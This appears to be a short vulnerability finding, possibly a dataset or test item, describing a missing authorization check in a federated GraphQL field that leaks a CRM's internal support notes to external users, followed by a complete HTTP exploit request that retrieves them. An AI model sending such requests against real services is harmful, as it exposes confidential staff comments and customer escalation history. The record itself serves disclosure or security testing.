diagnosis: The federated field resolver SupportTicket.internalNotes returns private staff comments and customer escalation history for parent.id without asserting that context.user is an authorized support staff member or agent. Any external user querying their ticket through the gateway can expose confidential internal notes.
exploit_request:
POST /graphql HTTP/1.1
Host: api.crm-federated.com
Authorization: Bearer <external_user_token>
Content-Type: application/json

{"query": "query { ticket(id: \"65a881bc92e109a2001e4590\") { id internalNotes } }"}
